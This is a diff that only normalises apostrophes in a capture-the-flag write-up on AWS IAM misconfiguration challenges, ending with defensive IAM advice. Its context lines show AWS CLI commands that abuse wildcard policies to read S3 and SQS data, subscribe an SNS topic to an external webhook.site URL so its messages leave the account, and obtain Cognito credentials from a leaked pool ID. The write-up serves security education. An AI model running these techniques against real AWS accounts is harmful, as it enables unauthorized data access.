@@ -59,7 +59,7 @@ From the existing policy, we can conclude that we have access to a certain bucke
 2023-06-08 19:18:24      81889 logo.png
 ```
 
-And there’s our flag. If we try to download it, we’ll encounter an error indicating that the filesystem is read-only -- which makes sense, but poses an obstacle for us. However, we can overcome this issue by copying the file to stdin and printing it to the console:
+And there's our flag. If we try to download it, we'll encounter an error indicating that the filesystem is read-only -- which makes sense, but poses an obstacle for us. However, we can overcome this issue by copying the file to stdin and printing it to the console:
 
 ```bash
 > aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt - | cat
@@ -105,7 +105,7 @@ From this policy, we can conclude that we're meant to receive a message from the
 aws: error: the following arguments are required: --queue-url
 ```
 
-To read a message from the queue, we need a queue URL, but we only have an ARN. That’s not a problem -- we can construct one ourselves. Queue URLs follow this format: `https://sqs.{region}.amazonaws.com/{account}/{queue_name}`.
+To read a message from the queue, we need a queue URL, but we only have an ARN. That's not a problem -- we can construct one ourselves. Queue URLs follow this format: `https://sqs.{region}.amazonaws.com/{account}/{queue_name}`.
 
 ```bash
 > aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
@@ -119,14 +119,14 @@ To read a message from the queue, we need a queue URL, but we only have an ARN. 
 }
 ```
 
-No flag here, but we do have a URL pointing to a file in a bucket. Let’s check out that file.
+No flag here, but we do have a URL pointing to a file in a bucket. Let's check out that file.
 
 ```bash
 > curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
 {wiz:you-are-at-the-front-of-the-queue}
 ```
 
-Bingo! There’s our flag and another completed challenge.
+Bingo! There's our flag and another completed challenge.
 
 ## Challnge 3: Enable Push Notifications
 
@@ -159,7 +159,7 @@ Bingo! There’s our flag and another completed challenge.
 }
 ```
 
-The policy clearly wants us to subscribe to this SNS topic. I’d be happy to oblige! Since we have a wildcard (`*`) before `@tbic.wiz.io`, it means we can use any email!
+The policy clearly wants us to subscribe to this SNS topic. I'd be happy to oblige! Since we have a wildcard (`*`) before `@tbic.wiz.io`, it means we can use any email!
 
 ```bash
 > aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint hello@tbic.wiz.io
@@ -172,7 +172,7 @@ And now we wait.
 
 Wait, what? Wait for what? How do I confirm the subscription to the topic if I have no access to the email? Looks like I fell into the easiest trap!
 
-Okay, let’s think. Since we don’t have access to email, we need to figure out another way to receive a message from the topic. How can we do that? What are the options to receive messages from SNS? We can use the following protocols to communicate with SNS: HTTP, HTTPS, email, email-json, SMS, SQS, application, Lambda, and Firehose. What if we set up an HTTP endpoint to receive messages? Webhooks, here we go! Luckily, there are [services](https://webhook.site) online that allow us to test webhook requests. The trick here is to take the unique webhook URL and add the required endpoint string to the end of the URL: `https://webhook.site/3bddcb48-f58d-4284-a731-491c8784e0b1/@tbic.wiz.io`. Still a valid URL? Let’s find out!
+Okay, let's think. Since we don't have access to email, we need to figure out another way to receive a message from the topic. How can we do that? What are the options to receive messages from SNS? We can use the following protocols to communicate with SNS: HTTP, HTTPS, email, email-json, SMS, SQS, application, Lambda, and Firehose. What if we set up an HTTP endpoint to receive messages? Webhooks, here we go! Luckily, there are [services](https://webhook.site) online that allow us to test webhook requests. The trick here is to take the unique webhook URL and add the required endpoint string to the end of the URL: `https://webhook.site/3bddcb48-f58d-4284-a731-491c8784e0b1/@tbic.wiz.io`. Still a valid URL? Let's find out!
 
 ```bash
 > aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://webhook.site/3bddcb48-f58d-4284-a731-491c8784e0b1/@tbic.wiz.io
@@ -237,7 +237,7 @@ The provided IAM policy clearly states that listing files in a bucket is only al
 <ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>thebigiamchallenge-admin-storage-abf1321</Name><Prefix>files/</Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>files/flag-as-admin.txt</Key><LastModified>2023-06-07T19:15:43.000Z</LastModified><ETag>"e365cfa7365164c05d7a9c209c4d8514"</ETag><Size>42</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>files/logo-admin.png</Key><LastModified>2023-06-08T19:20:01.000Z</LastModified><ETag>"c57e95e6d6c138818bf38daac6216356"</ETag><Size>81889</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>
 ```
 
-He-he, there it is. Here are the droids I’m looking for!
+He-he, there it is. Here are the droids I'm looking for!
 
 ```bash
 > aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt - | cat
@@ -283,7 +283,7 @@ Challenge 4 is complete.
 }
 ```
 
-Okay, let’s dissect what we have here. First things first, `cognito-sync:*` is our way to the contents of the bucket mentioned in the second statement of the policy. I feel like `mobileanalytics:PutEvents` is a bit misleading here and may not prove useful, but we’ll see. There’s also a picture of AWS Cognito in this task, which is unusual. Perhaps it’s also a clue? Let’s inspect the code.
+Okay, let's dissect what we have here. First things first, `cognito-sync:*` is our way to the contents of the bucket mentioned in the second statement of the policy. I feel like `mobileanalytics:PutEvents` is a bit misleading here and may not prove useful, but we'll see. There's also a picture of AWS Cognito in this task, which is unusual. Perhaps it's also a clue? Let's inspect the code.
 
 ```html
 <img style="width: 16rem" id="signedImg" class="mx-auto mt-4" src="#" alt="Signed img from S3" />
@@ -309,7 +309,7 @@ Okay, let’s dissect what we have here. First things first, `cognito-sync:*` is
 </script>
 ```
 
-Yep, there it is -- a very helpfully placed Cognito Identity Pool ID. Let’s use it to obtain our ID:
+Yep, there it is -- a very helpfully placed Cognito Identity Pool ID. Let's use it to obtain our ID:
 
 ```bash
 > aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
@@ -354,7 +354,7 @@ $ aws s3 cp s3://wiz-privatefiles/flag1.txt - | cat
 {wiz:incognito-is-always-suspicious}
 ```
 
-Oh boy, I couldn’t agree more. A very fun and very interesting challenge done. Let’s finish the final one!
+Oh boy, I couldn't agree more. A very fun and very interesting challenge done. Let's finish the final one!
 
 ## Challenge 6: One final push
 
@@ -452,24 +452,24 @@ And this is it. The final challenge is done. Congratulations!
 
 ## Post Mortem
 
-I had a great time solving these challenges (unless I didn’t). They were fun, but at the same time complex and deceptive..
+I had a great time solving these challenges (unless I didn't). They were fun, but at the same time complex and deceptive..
 
-Truth be told, some scenarios I was able to solve only with the help of guides from the internet. Only while writing this article did I realize that the image in challenge #5 was actually a clue and not a random picture. Because of this oversight, I had no idea where to look for the Identity Pool ID, so I had to google for a clue. Turns out it was right there all the time -- I just wasn’t bright enough to connect the dots.
+Truth be told, some scenarios I was able to solve only with the help of guides from the internet. Only while writing this article did I realize that the image in challenge #5 was actually a clue and not a random picture. Because of this oversight, I had no idea where to look for the Identity Pool ID, so I had to google for a clue. Turns out it was right there all the time -- I just wasn't bright enough to connect the dots.
 
 But fun aside, all of these challenges represent possible ways an attacker can extract helpful tips, even from the most innocent pieces of information -- like IAM policies. For example, leaving `*` in the `Principal` field allows any actor to subscribe to our queue. And I mean *any* -- including unintended actors.
 
-Another interesting example of possible loopholes is limiting allowed actions to only `s3:GetObject` for all actors. It sounds quite safe, right? How can you get a file you don’t know the name or location of? Turns out, there are ways, thanks to the HTTP endpoints and the `?prefix=` parameter.
+Another interesting example of possible loopholes is limiting allowed actions to only `s3:GetObject` for all actors. It sounds quite safe, right? How can you get a file you don't know the name or location of? Turns out, there are ways, thanks to the HTTP endpoints and the `?prefix=` parameter.
 
 And my favorite example of how a malicious actor can follow the breadcrumbs is the leftover of a single ID -- and how it can lead to a full-scale breach of a secured perimeter, compromising sensitive data.
 
-Learning best practices for keeping your AWS infrastructure secure in theory is one thing. Actually seeing how even the tiniest misconfigurations can lead to a disaster -- that’s totally another. And I love it.
+Learning best practices for keeping your AWS infrastructure secure in theory is one thing. Actually seeing how even the tiniest misconfigurations can lead to a disaster -- that's totally another. And I love it.
 
-Finally, to address the elephant in the room, let’s wrap this article with the most important statements regarding AWS IAM policies:
+Finally, to address the elephant in the room, let's wrap this article with the most important statements regarding AWS IAM policies:
 
 * Always specify access to certain actions for specific resources and dedicated principals: never leave wildcard permissions anywhere.
 * Separate the open perimeter and closed perimeter of your infrastructure, and restrict access only to assigned individuals.
 * Create alerts to notify you when a user from a certain group is trying to perform an unusual action -- and is trying it repeatedly.
-* Prioritize temporary credentials assignment instead of perpetual access keys. Access keys should only be used by automated workflows (though even this is a bad practice) and should be rotated regularly. Luckily, automation doesn’t complain if you’re asking it to change the password every month.
+* Prioritize temporary credentials assignment instead of perpetual access keys. Access keys should only be used by automated workflows (though even this is a bad practice) and should be rotated regularly. Luckily, automation doesn't complain if you're asking it to change the password every month.
 
 Stay secure.
 
